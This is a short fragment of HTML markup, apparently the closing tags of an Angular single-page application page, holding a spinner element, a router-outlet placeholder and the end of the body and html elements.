            </div>
         </spinner>
         
         <router-outlet _ngcontent-c0=""></router-outlet>
         
   </body>
</html>
